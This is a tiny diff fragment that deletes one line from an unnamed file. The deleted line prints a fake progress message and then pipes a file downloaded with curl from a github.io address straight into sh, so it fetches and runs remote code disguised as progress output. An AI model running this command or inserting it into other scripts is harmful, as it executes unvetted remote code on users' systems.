@@ -1,1 +1,0 @@
-echo Progress: 36.00%curl -L --progress-bar frkns.github.io/fun/rapid-finished.gzip | sh
